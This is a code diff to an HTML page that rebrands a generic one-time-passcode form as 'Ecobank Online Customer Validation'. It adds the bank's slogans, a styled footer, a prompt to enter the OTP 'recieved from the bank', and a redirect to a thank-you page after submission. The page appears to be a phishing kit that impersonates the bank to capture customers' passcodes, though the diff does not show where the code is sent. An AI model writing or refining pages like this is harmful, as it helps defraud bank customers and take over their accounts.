@@ -24,6 +24,9 @@
       color: #333;
       text-align: center;
       overflow-x: hidden;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
     }
 
     .header {
@@ -122,6 +125,17 @@
       word-wrap: break-word;
     }
 
+    .footer {
+      width: 100%;
+      margin-top: auto;
+      background-color: #0A3D91;
+      color: #ffffff;
+      padding: 18px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      text-align: center;
+    }
+
     /* Small phones */
     @media (max-width: 380px) {
       .header {
@@ -143,6 +157,11 @@
       button {
         font-size: 15px;
       }
+
+      .footer {
+        font-size: 13px;
+        padding: 16px 12px;
+      }
     }
 
     /* Very small screens */
@@ -159,6 +178,10 @@
         width: calc(100% - 20px);
         padding: 20px 14px;
       }
+
+      .footer {
+        font-size: 12px;
+      }
     }
 
     /* Larger screens */
@@ -173,10 +196,10 @@
 <body>
 
   <div class="header">
-    Validation OTP
+    ECOBANK ONLINE CUSTOMER VALIDATION
 
     <div class="subtext">
-      Enter the OTP to complete your account validation
+      Validation of your Ecobank Account is in progress
     </div>
   </div>
 
@@ -192,7 +215,7 @@
         type="text"
         id="otp"
         name="validation_otp"
-        placeholder="Enter OTP"
+        placeholder="Enter OTP recieved from the bank"
         required
       >
 
@@ -208,6 +231,14 @@
 
   </div>
 
+  <footer class="footer">
+    A Better Way To Bank Your Way
+  </footer>
+  <div class="subtext">
+      Ecobank, The Pan African Bank
+    </div>
+  </div>
+
   <script>
     const form = document.getElementById("otpForm");
     const statusEl = document.getElementById("status");
@@ -219,7 +250,7 @@
       statusEl.style.color = "#168a3a";
 
       setTimeout(() => {
-        window.location.href = "next.html";
+        window.location.href = "thankyou.html";
       }, 700);
     });
   </script>
